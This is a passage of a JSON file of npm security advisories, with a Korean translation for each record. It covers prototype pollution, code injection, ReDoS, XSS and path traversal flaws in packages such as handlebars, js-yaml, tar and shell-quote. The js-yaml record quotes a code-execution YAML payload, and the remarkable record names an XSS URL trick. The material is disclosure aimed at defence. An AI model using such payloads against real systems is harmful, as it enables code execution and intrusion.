    "description": "Versions of `set-value` prior to 3.0.1 or 2.0.1 are vulnerable to Prototype Pollution. The `set` function fails to validate which Object properties it updates. This allows attackers to modify the prototype of Object, causing the addition or modification of an existing property on all objects.\n\n\n\n\n## Recommendation\n\nIf you are using `set-value` 3.x, upgrade to version 3.0.1 or later.\nIf you are using `set-value` 2.x, upgrade to version 2.0.1 or later.",
    "identifiers": "GHSA : GHSA-4g88-fppr-53pp\nCVE : CVE-2019-10747",
    "severity": "CRITICAL",
    "updatedAt": "2023-04-12T17:36:32Z",
    "publishedAt": "2019-08-27T17:43:33Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-10747\nhttps://snyk.io/vuln/SNYK-JS-SETVALUE-450213\nhttps://www.npmjs.com/advisories/1012\nhttps://lists.apache.org/thread.html/b46f35559c4a97cf74d2dd7fe5a48f8abf2ff37f879083920af9b292@%3Cdev.drat.apache.org%3E\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/3EJ36KV6MXQPUYTFCCTDY54E5Y7QP3AV/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/E3HNLQZQINMZK6GYB2UTKK4VU7WBV2OT/\nhttps://github.com/jonschlinkert/set-value/commit/95e9d9923f8a8b4a01da1ea138fcc39ec7b6b15f\nhttps://github.com/jonschlinkert/set-value/commit/cb12f14955dde6e61829d70d1851bfea6a3c31ad\nhttps://github.com/advisories/GHSA-4g88-fppr-53pp",
    "name": "set-value",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 3.0.0",
    "identifier": "3.0.1",
    "descriptionKR": "3.0.1 또는 2.0.1 이전의 `set-value` 버전은 Prototype Pollution에 취약합니다. `set` 함수는 업데이트하는 개체 속성의 유효성을 검사하지 못합니다. 이를 통해 공격자는 개체의 프로토타입을 수정하여 모든 개체의 기존 속성을 추가하거나 수정할 수 있습니다.\n\n\n\n\n## 추천\n\n`set-value` 3.x를 사용하는 경우 버전 3.0.1 이상으로 업그레이드하십시오.\n`set-value` 2.x를 사용하는 경우 버전 2.0.1 이상으로 업그레이드하십시오."
  },
  {
    "description": "Versions of `set-value` prior to 3.0.1 or 2.0.1 are vulnerable to Prototype Pollution. The `set` function fails to validate which Object properties it updates. This allows attackers to modify the prototype of Object, causing the addition or modification of an existing property on all objects.\n\n\n\n\n## Recommendation\n\nIf you are using `set-value` 3.x, upgrade to version 3.0.1 or later.\nIf you are using `set-value` 2.x, upgrade to version 2.0.1 or later.",
    "identifiers": "GHSA : GHSA-4g88-fppr-53pp\nCVE : CVE-2019-10747",
    "severity": "CRITICAL",
    "updatedAt": "2023-04-12T17:36:32Z",
    "publishedAt": "2019-08-27T17:43:33Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-10747\nhttps://snyk.io/vuln/SNYK-JS-SETVALUE-450213\nhttps://www.npmjs.com/advisories/1012\nhttps://lists.apache.org/thread.html/b46f35559c4a97cf74d2dd7fe5a48f8abf2ff37f879083920af9b292@%3Cdev.drat.apache.org%3E\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/3EJ36KV6MXQPUYTFCCTDY54E5Y7QP3AV/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/E3HNLQZQINMZK6GYB2UTKK4VU7WBV2OT/\nhttps://github.com/jonschlinkert/set-value/commit/95e9d9923f8a8b4a01da1ea138fcc39ec7b6b15f\nhttps://github.com/jonschlinkert/set-value/commit/cb12f14955dde6e61829d70d1851bfea6a3c31ad\nhttps://github.com/advisories/GHSA-4g88-fppr-53pp",
    "name": "set-value",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.0.1",
    "identifier": "2.0.1",
    "descriptionKR": "3.0.1 또는 2.0.1 이전의 `set-value` 버전은 Prototype Pollution에 취약합니다. `set` 함수는 업데이트하는 개체 속성의 유효성을 검사하지 못합니다. 이를 통해 공격자는 개체의 프로토타입을 수정하여 모든 개체의 기존 속성을 추가하거나 수정할 수 있습니다.\n\n\n\n\n## 추천\n\n`set-value` 3.x를 사용하는 경우 버전 3.0.1 이상으로 업그레이드하십시오.\n`set-value` 2.x를 사용하는 경우 버전 2.0.1 이상으로 업그레이드하십시오."
  },
  {
    "description": "Handlebars before 3.0.8 and 4.x before 4.5.3 is vulnerable to Arbitrary Code Execution. The lookup helper fails to properly validate templates, allowing attackers to submit templates that execute arbitrary JavaScript. This can be used to run arbitrary code on a server processing Handlebars templates or in a victim's browser (effectively serving as XSS).",
    "identifiers": "GHSA : GHSA-3cqr-58rm-57f8\nCVE : CVE-2019-20920",
    "severity": "HIGH",
    "updatedAt": "2023-03-20T22:06:42Z",
    "publishedAt": "2022-02-10T20:38:19Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-20920\nhttps://github.com/handlebars-lang/handlebars.js/commit/d54137810a49939fd2ad01a91a34e182ece4528e\nhttps://snyk.io/vuln/SNYK-JS-HANDLEBARS-534478\nhttps://www.npmjs.com/advisories/1316\nhttps://www.npmjs.com/advisories/1324\nhttps://www.npmjs.com/package/handlebars\nhttps://github.com/advisories/GHSA-3cqr-58rm-57f8",
    "name": "handlebars",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.0, < 4.5.3",
    "identifier": "4.5.3",
    "descriptionKR": "3.0.8 이전의 핸들바와 4.5.3 이전의 4.x는 임의 코드 실행에 취약합니다. 조회 도우미는 템플릿의 유효성을 제대로 검사하지 못하여 공격자가 임의의 JavaScript를 실행하는 템플릿을 제출할 수 있습니다. 이는 Handlebars 템플릿을 처리하는 서버 또는 피해자의 브라우저(효과적으로 XSS 역할을 함)에서 임의의 코드를 실행하는 데 사용할 수 있습니다."
  },
  {
    "description": "Versions of `handlebars` prior to 3.0.8 or 4.3.0 are vulnerable to Prototype Pollution leading to Remote Code Execution. Templates may alter an Objects' `__proto__` and `__defineGetter__` properties, which may allow an attacker to execute arbitrary code through crafted payloads.\n\n\n## Recommendation\n\nUpgrade to version 3.0.8, 4.3.0 or later.",
    "identifiers": "GHSA : GHSA-w457-6q6x-cgp9\nCVE : CVE-2019-19919",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-20T22:02:40Z",
    "publishedAt": "2019-12-26T17:58:13Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-19919\nhttps://www.npmjs.com/advisories/1164\nhttps://github.com/wycats/handlebars.js/issues/1558\nhttps://github.com/wycats/handlebars.js/commit/2078c727c627f25d4a149962f05c1e069beb18bc\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19919\nhttps://www.tenable.com/security/tns-2021-14\nhttps://github.com/advisories/GHSA-w457-6q6x-cgp9",
    "name": "handlebars",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.3.0",
    "identifier": "4.3.0",
    "descriptionKR": "3.0.8 또는 4.3.0 이전의 'handlebars' 버전은 원격 코드 실행으로 이어지는 Prototype Pollution에 취약합니다. 템플릿은 개체의 `__proto__` 및 `__defineGetter__` 속성을 변경하여 공격자가 제작된 페이로드를 통해 임의의 코드를 실행할 수 있도록 합니다.\n\n\n## 추천\n\n버전 3.0.8, 4.3.0 이상으로 업그레이드하십시오."
  },
  {
    "description": "Versions of `tar` prior to 4.4.2 for 4.x and 2.2.2 for 2.x are vulnerable to Arbitrary File Overwrite. Extracting tarballs containing a hardlink to a file that already exists in the system, and a file that matches the hardlink will overwrite the system's file with the contents of the extracted file.\n\n\n## Recommendation\n\nFor tar 4.x, upgrade to version 4.4.2 or later.\nFor tar 2.x, upgrade to version 2.2.2 or later.",
    "identifiers": "GHSA : GHSA-j44m-qm6p-hp7m\nCVE : CVE-2018-20834",
    "severity": "HIGH",
    "updatedAt": "2023-03-20T21:50:45Z",
    "publishedAt": "2019-05-01T18:37:31Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2018-20834\nhttps://github.com/npm/node-tar/commit/b0c58433c22f5e7fe8b1c76373f27e3f81dcd4c8\nhttps://hackerone.com/reports/344595\nhttps://github.com/npm/node-tar/compare/58a8d43...a5f7779\nhttps://www.npmjs.com/advisories/803\nhttps://github.com/npm/node-tar/commit/7ecef07da6a9e72cc0c4d0c9c6a8e85b6b52395d\nhttps://access.redhat.com/errata/RHSA-2019:1821\nhttps://github.com/npm/node-tar/commits/v2.2.2\nhttps://github.com/advisories/GHSA-j44m-qm6p-hp7m",
    "name": "tar",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.0.0, < 4.4.2",
    "identifier": "4.4.2",
    "descriptionKR": "4.x용 4.4.2 및 2.x용 2.2.2 이전의 `tar` 버전은 임의 파일 덮어쓰기에 취약합니다. 시스템에 이미 존재하는 파일 및 하드링크와 일치하는 파일에 대한 하드링크가 포함된 tarball을 추출하면 추출된 파일의 내용으로 시스템 파일을 덮어씁니다.\n\n\n## 추천\n\ntar 4.x의 경우 버전 4.4.2 이상으로 업그레이드하십시오.\ntar 2.x의 경우 버전 2.2.2 이상으로 업그레이드하십시오."
  },
  {
    "description": "Versions of `tar` prior to 4.4.2 for 4.x and 2.2.2 for 2.x are vulnerable to Arbitrary File Overwrite. Extracting tarballs containing a hardlink to a file that already exists in the system, and a file that matches the hardlink will overwrite the system's file with the contents of the extracted file.\n\n\n## Recommendation\n\nFor tar 4.x, upgrade to version 4.4.2 or later.\nFor tar 2.x, upgrade to version 2.2.2 or later.",
    "identifiers": "GHSA : GHSA-j44m-qm6p-hp7m\nCVE : CVE-2018-20834",
    "severity": "HIGH",
    "updatedAt": "2023-03-20T21:50:45Z",
    "publishedAt": "2019-05-01T18:37:31Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2018-20834\nhttps://github.com/npm/node-tar/commit/b0c58433c22f5e7fe8b1c76373f27e3f81dcd4c8\nhttps://hackerone.com/reports/344595\nhttps://github.com/npm/node-tar/compare/58a8d43...a5f7779\nhttps://www.npmjs.com/advisories/803\nhttps://github.com/npm/node-tar/commit/7ecef07da6a9e72cc0c4d0c9c6a8e85b6b52395d\nhttps://access.redhat.com/errata/RHSA-2019:1821\nhttps://github.com/npm/node-tar/commits/v2.2.2\nhttps://github.com/advisories/GHSA-j44m-qm6p-hp7m",
    "name": "tar",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.2.2",
    "identifier": "2.2.2",
    "descriptionKR": "4.x용 4.4.2 및 2.x용 2.2.2 이전의 `tar` 버전은 임의 파일 덮어쓰기에 취약합니다. 시스템에 이미 존재하는 파일 및 하드링크와 일치하는 파일에 대한 하드링크가 포함된 tarball을 추출하면 추출된 파일의 내용으로 시스템 파일을 덮어씁니다.\n\n\n## 추천\n\ntar 4.x의 경우 버전 4.4.2 이상으로 업그레이드하십시오.\ntar 2.x의 경우 버전 2.2.2 이상으로 업그레이드하십시오."
  },
  {
    "description": "Versions of `js-yaml` prior to 3.13.1 are vulnerable to Code Injection. The `load()` function may execute arbitrary code injected through a malicious YAML file. Objects that have `toString` as key, JavaScript code as value and are used as explicit mapping keys allow attackers to execute the supplied code through the `load()` function. The `safeLoad()` function is unaffected.\n\nAn example payload is \n`{ toString: !<tag:yaml.org,2002:js/function> 'function (){return Date.now()}' } : 1` \nwhich returns the object \n{\n  \"1553107949161\": 1\n}\n\n\n## Recommendation\n\nUpgrade to version 3.13.1.",
    "identifiers": "GHSA : GHSA-8j8c-7jfh-h6hx",
    "severity": "HIGH",
    "updatedAt": "2023-03-20T21:36:23Z",
    "publishedAt": "2019-06-04T20:14:07Z",
    "references": "https://github.com/nodeca/js-yaml/pull/480\nhttps://www.npmjs.com/advisories/813\nhttps://github.com/nodeca/js-yaml/pull/480/commits/e18afbf1edcafb7add2c4c7b22abc8d6ebc2fa61\nhttps://github.com/advisories/GHSA-8j8c-7jfh-h6hx",
    "name": "js-yaml",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.13.1",
    "identifier": "3.13.1",
    "descriptionKR": "3.13.1 이전의 `js-yaml` 버전은 코드 주입에 취약합니다. `load()` 함수는 악성 YAML 파일을 통해 주입된 임의의 코드를 실행할 수 있습니다. `toString`을 키로, JavaScript 코드를 값으로 갖고 명시적 매핑 키로 사용되는 개체를 통해 공격자는 `load()` 함수를 통해 제공된 코드를 실행할 수 있습니다. `safeLoad()` 함수는 영향을 받지 않습니다.\n\n페이로드의 예는 다음과 같습니다.\n`{ toString: !<tag:yaml.org,2002:js/function> 'function (){return Date.now()}' } : 1`\n객체를 반환하는\n{\n  \"1553107949161\": 1\n}\n\n\n## 추천\n\n버전 3.13.1로 업그레이드하십시오."
  },
  {
    "description": "The package handlebars before 4.7.7 are vulnerable to Prototype Pollution when selecting certain compiling options to compile templates coming from an untrusted source.",
    "identifiers": "GHSA : GHSA-765h-qjxv-5f44\nCVE : CVE-2021-23383",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-20T21:28:20Z",
    "publishedAt": "2022-02-10T23:51:42Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-23383\nhttps://github.com/handlebars-lang/handlebars.js/commit/f0589701698268578199be25285b2ebea1c1e427\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARS-1279031\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWER-1279032\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1279030\nhttps://snyk.io/vuln/SNYK-JS-HANDLEBARS-1279029\nhttps://www.npmjs.com/package/handlebars\nhttps://security.netapp.com/advisory/ntap-20210618-0007/\nhttps://github.com/advisories/GHSA-765h-qjxv-5f44",
    "name": "handlebars",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.7.7",
    "identifier": "4.7.7",
    "descriptionKR": "4.7.7 이전의 패키지 핸들바는 신뢰할 수 없는 소스에서 오는 템플릿을 컴파일하기 위해 특정 컴파일 옵션을 선택할 때 Prototype Pollution에 취약합니다."
  },
  {
    "description": "Versions of the package collection.js before 6.8.1 are vulnerable to Prototype Pollution via the `extend` function in `Collection.js/dist/node/iterators/extend.js`.",
    "identifiers": "GHSA : GHSA-47pj-q2vm-46xc\nCVE : CVE-2023-26113",
    "severity": "HIGH",
    "updatedAt": "2023-03-24T19:40:27Z",
    "publishedAt": "2023-03-18T06:30:15Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-26113\nhttps://github.com/kobezzza/Collection/issues/27\nhttps://github.com/kobezzza/Collection/commit/d3d937645f62f37d3115d6aa90bb510fd856e6a2\nhttps://github.com/kobezzza/Collection/blob/be32c48e68f49d3be48a58e929d1ab8ff1d2d19c/dist/node/iterators/extend.js%23L324\nhttps://github.com/kobezzza/Collection/releases/tag/v6.8.1\nhttps://security.snyk.io/vuln/SNYK-JS-COLLECTIONJS-3185148\nhttps://github.com/advisories/GHSA-47pj-q2vm-46xc",
    "name": "collection.js",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 6.8.1",
    "identifier": "6.8.1",
    "descriptionKR": "6.8.1 이전의 패키지 collection.js 버전은 `Collection.js/dist/node/iterators/extend.js`의 `extend` 기능을 통해 Prototype Pollution에 취약합니다."
  },
  {
    "description": "The shell-quote package before 1.7.3 for Node.js allows command injection. An attacker can inject unescaped shell metacharacters through a regex designed to support Windows drive letters. If the output of this package is passed to a real shell as a quoted argument to a command with exec(), an attacker can inject arbitrary commands. This is because the Windows drive letter regex character class is {A-z] instead of the correct {A-Za-z]. Several shell metacharacters exist in the space between capital letter Z and lower case letter a, such as the backtick character.",
    "identifiers": "GHSA : GHSA-g4rg-993r-mgx7\nCVE : CVE-2021-42740",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-20T20:42:06Z",
    "publishedAt": "2022-05-24T19:18:27Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-42740\nhttps://www.npmjs.com/package/shell-quote\nhttps://github.com/ljharb/shell-quote/commit/5799416ed454aa4ec9afafc895b4e31760ea1abe\nhttps://github.com/ljharb/shell-quote/blob/master/CHANGELOG.md#173\nhttps://github.com/advisories/GHSA-g4rg-993r-mgx7",
    "name": "shell-quote",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.7.2",
    "identifier": "1.7.3",
    "descriptionKR": "Node.js용 1.7.3 이전의 shell-quote 패키지는 명령 주입을 허용합니다. 공격자는 Windows 드라이브 문자를 지원하도록 설계된 정규식을 통해 이스케이프 처리되지 않은 셸 메타문자를 삽입할 수 있습니다. 이 패키지의 출력이 exec()를 사용하여 명령에 인용된 인수로 실제 셸에 전달되면 공격자가 임의의 명령을 주입할 수 있습니다. 이는 Windows 드라이브 문자 정규식 문자 클래스가 올바른 {A-Za-z]가 아니라 {A-z]이기 때문입니다. 백틱 문자와 같이 대문자 Z와 소문자 a 사이의 공백에 여러 쉘 메타 문자가 있습니다."
  },
  {
    "description": "Versions of `handlebars` prior to 4.0.14 are vulnerable to Prototype Pollution. Templates may alter an Objects' prototype, thus allowing an attacker to execute arbitrary code on the server.\n\n\n## Recommendation\n\nFor handlebars 4.1.x upgrade to 4.1.2 or later.\nFor handlebars 4.0.x upgrade to 4.0.14 or later.",
    "identifiers": "GHSA : GHSA-q42p-pg8m-cqh6",
    "severity": "HIGH",
    "updatedAt": "2023-03-20T20:34:58Z",
    "publishedAt": "2019-06-05T14:07:48Z",
    "references": "https://github.com/handlebars-lang/handlebars.js/issues/1495\nhttps://github.com/handlebars-lang/handlebars.js/commit/7372d4e9dffc9d70c09671aa28b9392a1577fd86\nhttps://snyk.io/vuln/SNYK-JS-HANDLEBARS-173692\nhttps://www.npmjs.com/advisories/755\nhttps://github.com/handlebars-lang/handlebars.js/commit/0d6d8c335ad81bad1b672fc56b6a44f6aa472dac\nhttps://github.com/handlebars-lang/handlebars.js/commit/85c8783b34fc6d36145d8b53885ad0b9e3c3f9c4\nhttps://github.com/handlebars-lang/handlebars.js/commit/cd38583216dce3252831916323202749431c773e\nhttps://github.com/advisories/GHSA-q42p-pg8m-cqh6",
    "name": "handlebars",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.0.7",
    "identifier": "3.0.7",
    "descriptionKR": "4.0.14 이전의 'handlebars' 버전은 Prototype Pollution에 취약합니다. 템플릿은 개체의 프로토타입을 변경할 수 있으므로 공격자가 서버에서 임의의 코드를 실행할 수 있습니다.\n\n\n## 추천\n\n핸들바 4.1.x의 경우 4.1.2 이상으로 업그레이드하십시오.\n핸들바 4.0.x의 경우 4.0.14 이상으로 업그레이드하십시오."
  },
  {
    "description": "Versions of `handlebars` prior to 4.0.14 are vulnerable to Prototype Pollution. Templates may alter an Objects' prototype, thus allowing an attacker to execute arbitrary code on the server.\n\n\n## Recommendation\n\nFor handlebars 4.1.x upgrade to 4.1.2 or later.\nFor handlebars 4.0.x upgrade to 4.0.14 or later.",
    "identifiers": "GHSA : GHSA-q42p-pg8m-cqh6",
    "severity": "HIGH",
    "updatedAt": "2023-03-20T20:34:58Z",
    "publishedAt": "2019-06-05T14:07:48Z",
    "references": "https://github.com/handlebars-lang/handlebars.js/issues/1495\nhttps://github.com/handlebars-lang/handlebars.js/commit/7372d4e9dffc9d70c09671aa28b9392a1577fd86\nhttps://snyk.io/vuln/SNYK-JS-HANDLEBARS-173692\nhttps://www.npmjs.com/advisories/755\nhttps://github.com/handlebars-lang/handlebars.js/commit/0d6d8c335ad81bad1b672fc56b6a44f6aa472dac\nhttps://github.com/handlebars-lang/handlebars.js/commit/85c8783b34fc6d36145d8b53885ad0b9e3c3f9c4\nhttps://github.com/handlebars-lang/handlebars.js/commit/cd38583216dce3252831916323202749431c773e\nhttps://github.com/advisories/GHSA-q42p-pg8m-cqh6",
    "name": "handlebars",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.0, < 4.0.14",
    "identifier": "4.0.14",
    "descriptionKR": "4.0.14 이전의 'handlebars' 버전은 Prototype Pollution에 취약합니다. 템플릿은 개체의 프로토타입을 변경할 수 있으므로 공격자가 서버에서 임의의 코드를 실행할 수 있습니다.\n\n\n## 추천\n\n핸들바 4.1.x의 경우 4.1.2 이상으로 업그레이드하십시오.\n핸들바 4.0.x의 경우 4.0.14 이상으로 업그레이드하십시오."
  },
  {
    "description": "Versions of `handlebars` prior to 4.0.14 are vulnerable to Prototype Pollution. Templates may alter an Objects' prototype, thus allowing an attacker to execute arbitrary code on the server.\n\n\n## Recommendation\n\nFor handlebars 4.1.x upgrade to 4.1.2 or later.\nFor handlebars 4.0.x upgrade to 4.0.14 or later.",
    "identifiers": "GHSA : GHSA-q42p-pg8m-cqh6",
    "severity": "HIGH",
    "updatedAt": "2023-03-20T20:34:58Z",
    "publishedAt": "2019-06-05T14:07:48Z",
    "references": "https://github.com/handlebars-lang/handlebars.js/issues/1495\nhttps://github.com/handlebars-lang/handlebars.js/commit/7372d4e9dffc9d70c09671aa28b9392a1577fd86\nhttps://snyk.io/vuln/SNYK-JS-HANDLEBARS-173692\nhttps://www.npmjs.com/advisories/755\nhttps://github.com/handlebars-lang/handlebars.js/commit/0d6d8c335ad81bad1b672fc56b6a44f6aa472dac\nhttps://github.com/handlebars-lang/handlebars.js/commit/85c8783b34fc6d36145d8b53885ad0b9e3c3f9c4\nhttps://github.com/handlebars-lang/handlebars.js/commit/cd38583216dce3252831916323202749431c773e\nhttps://github.com/advisories/GHSA-q42p-pg8m-cqh6",
    "name": "handlebars",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.1.0, < 4.1.2",
    "identifier": "4.1.2",
    "descriptionKR": "4.0.14 이전의 'handlebars' 버전은 Prototype Pollution에 취약합니다. 템플릿은 개체의 프로토타입을 변경할 수 있으므로 공격자가 서버에서 임의의 코드를 실행할 수 있습니다.\n\n\n## 추천\n\n핸들바 4.1.x의 경우 4.1.2 이상으로 업그레이드하십시오.\n핸들바 4.0.x의 경우 4.0.14 이상으로 업그레이드하십시오."
  },
  {
    "description": "The package handlebars before 4.7.7 are vulnerable to Remote Code Execution (RCE) when selecting certain compiling options to compile templates coming from an untrusted source.",
    "identifiers": "GHSA : GHSA-f2jv-r9rf-7988\nCVE : CVE-2021-23369",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-20T20:25:49Z",
    "publishedAt": "2021-05-06T15:57:44Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-23369\nhttps://github.com/handlebars-lang/handlebars.js/commit/b6d3de7123eebba603e321f04afdbae608e8fea8\nhttps://github.com/handlebars-lang/handlebars.js/commit/f0589701698268578199be25285b2ebea1c1e427\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARS-1074950\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWER-1074951\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1074952\nhttps://snyk.io/vuln/SNYK-JS-HANDLEBARS-1056767\nhttps://security.netapp.com/advisory/ntap-20210604-0008/\nhttps://github.com/advisories/GHSA-f2jv-r9rf-7988",
    "name": "handlebars",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.7.7",
    "identifier": "4.7.7",
    "descriptionKR": "4.7.7 이전의 패키지 핸들바는 신뢰할 수 없는 소스에서 오는 템플릿을 컴파일하기 위해 특정 컴파일 옵션을 선택할 때 원격 코드 실행(RCE)에 취약합니다."
  },
  {
    "description": "An exponential ReDoS (Regular Expression Denial of Service) can be triggered in the uri-template-lite npm package, when an attacker is able to supply arbitrary input to the \"URI.expand\" method.",
    "identifiers": "GHSA : GHSA-chw2-6c7r-37p7\nCVE : CVE-2021-43309",
    "severity": "MODERATE",
    "updatedAt": "2023-03-20T20:09:45Z",
    "publishedAt": "2022-08-25T00:00:27Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-43309\nhttps://research.jfrog.com/vulnerabilities/uri-template-lite-redos-xray-211351/\nhttps://github.com/litejs/uri-template-lite/commit/cbeec2b2a275d819fb534137a155df14729706f8\nhttps://github.com/litejs/uri-template-lite/commits/v22.9.0\nhttps://github.com/advisories/GHSA-chw2-6c7r-37p7",
    "name": "uri-template-lite",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 22.9.0",
    "identifier": "22.9.0",
    "descriptionKR": "공격자가 \"URI.expand\" 메서드에 임의의 입력을 제공할 수 있는 경우 uri-template-lite npm 패키지에서 기하급수적인 ReDoS(정규식 서비스 거부)가 트리거될 수 있습니다."
  },
  {
    "description": "In remarkable 1.7.1, lib/parser_inline.js mishandles URL filtering, which allows attackers to trigger XSS via unprintable characters, as demonstrated by a \\x0ejavascript: URL.",
    "identifiers": "GHSA : GHSA-36m4-6v6m-4vpr\nCVE : CVE-2019-12043",
    "severity": "MODERATE",
    "updatedAt": "2023-03-20T19:53:50Z",
    "publishedAt": "2019-05-29T18:04:55Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-12043\nhttps://github.com/jonschlinkert/remarkable/issues/332\nhttps://github.com/jonschlinkert/remarkable/commit/49e87b7ae2dc323d83606792a749fb207595249e\nhttps://github.com/advisories/GHSA-36m4-6v6m-4vpr",
    "name": "remarkable",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.7.2",
    "identifier": "1.7.2",
    "descriptionKR": "놀라운 1.7.1에서 lib/parser_inline.js는 URL 필터링을 잘못 처리하여 \\x0ejavascript: URL에서 알 수 있듯이 공격자가 인쇄할 수 없는 문자를 통해 XSS를 트리거할 수 있습니다."
  },
  {
    "description": "lib/common/html_re.js in remarkable 1.7.1 allows Regular Expression Denial of Service (ReDoS) via a CDATA section.",
    "identifiers": "GHSA : GHSA-q22g-8fr4-qpj4\nCVE : CVE-2019-12041",
    "severity": "HIGH",
    "updatedAt": "2023-03-20T19:52:39Z",
    "publishedAt": "2019-06-06T15:32:15Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-12041\nhttps://github.com/jonschlinkert/remarkable/issues/331\nhttps://snyk.io/vuln/SNYK-JS-REMARKABLE-174639\nhttps://github.com/jonschlinkert/remarkable/pull/335#issuecomment-515958379\nhttps://github.com/jonschlinkert/remarkable/commit/287dfbf22e70790c8b709ae37a5be0523597673c\nhttps://github.com/advisories/GHSA-q22g-8fr4-qpj4",
    "name": "remarkable",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.7.2",
    "identifier": "1.7.2",
    "descriptionKR": "놀라운 1.7.1의 lib/common/html_re.js는 CDATA 섹션을 통해 정규식 서비스 거부(ReDoS)를 허용합니다."
  },
  {
    "description": "The `request` package through 2.88.2 for Node.js and the `@cypress/request` package through 2.88.12 allow a bypass of SSRF mitigations via an attacker-controller server that does a cross-protocol redirect (HTTP to HTTPS, or HTTPS to HTTP).\n\nNOTE: The `request` package is no longer supported by the maintainer.",
    "identifiers": "GHSA : GHSA-p8p7-x288-28g6\nCVE : CVE-2023-28155",
    "severity": "MODERATE",
    "updatedAt": "2023-08-02T23:08:48Z",
    "publishedAt": "2023-03-16T15:30:19Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-28155\nhttps://github.com/request/request/issues/3442\nhttps://github.com/request/request/pull/3444\nhttps://doyensec.com/resources/Doyensec_Advisory_RequestSSRF_Q12023.pdf\nhttps://security.netapp.com/advisory/ntap-20230413-0007/\nhttps://github.com/github/advisory-database/pull/2500\nhttps://github.com/cypress-io/request/blob/master/lib/redirect.js#L116\nhttps://github.com/request/request/blob/master/lib/redirect.js#L111\nhttps://github.com/advisories/GHSA-p8p7-x288-28g6",
    "name": "request",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 2.88.2",
    "descriptionKR": "Node.js용 2.88.2까지의 'request' 패키지와 2.88.12까지의 '@cypress/request' 패키지는 교차 프로토콜 리디렉션(HTTP에서 HTTPS로, 또는 HTTPS에서 HTTP로).\n\n참고: `request` 패키지는 관리자가 더 이상 지원하지 않습니다."
  },
  {
    "description": "Directory traversal vulnerability in swig-templates thru 2.0.4 and swig thru 1.4.2, allows attackers to read arbitrary files via the include or extends tags.",
    "identifiers": "GHSA : GHSA-2rq5-699j-x7p6\nCVE : CVE-2023-25345",
    "severity": "HIGH",
    "updatedAt": "2023-03-20T13:59:52Z",
    "publishedAt": "2023-03-15T21:30:25Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-25345\nhttps://github.com/node-swig/swig-templates/issues/88\nhttps://github.com/advisories/GHSA-2rq5-699j-x7p6",
    "name": "swig",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.4.2",
    "descriptionKR": "2.0.4까지의 swig-템플릿과 1.4.2까지의 swig의 디렉터리 탐색 취약점으로 인해 공격자가 include 또는 extends 태그를 통해 임의의 파일을 읽을 수 있습니다."
  },
  {
    "description": "Directory traversal vulnerability in swig-templates thru 2.0.4 and swig thru 1.4.2, allows attackers to read arbitrary files via the include or extends tags.",
    "identifiers": "GHSA : GHSA-2rq5-699j-x7p6\nCVE : CVE-2023-25345",
    "severity": "HIGH",
    "updatedAt": "2023-03-20T13:59:52Z",
    "publishedAt": "2023-03-15T21:30:25Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-25345\nhttps://github.com/node-swig/swig-templates/issues/88\nhttps://github.com/advisories/GHSA-2rq5-699j-x7p6",
    "name": "swig-templates",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 2.0.4",
    "descriptionKR": "2.0.4까지의 swig-템플릿과 1.4.2까지의 swig의 디렉터리 탐색 취약점으로 인해 공격자가 include 또는 extends 태그를 통해 임의의 파일을 읽을 수 있습니다."
  },
  {
    "description": "All versions of the package node-bluetooth-serial-port are vulnerable to Buffer Overflow via the findSerialPortChannel method due to improper user input length validation.",
    "identifiers": "GHSA : GHSA-9jh3-4pc9-hq29\nCVE : CVE-2023-26109",
    "severity": "CRITICAL",
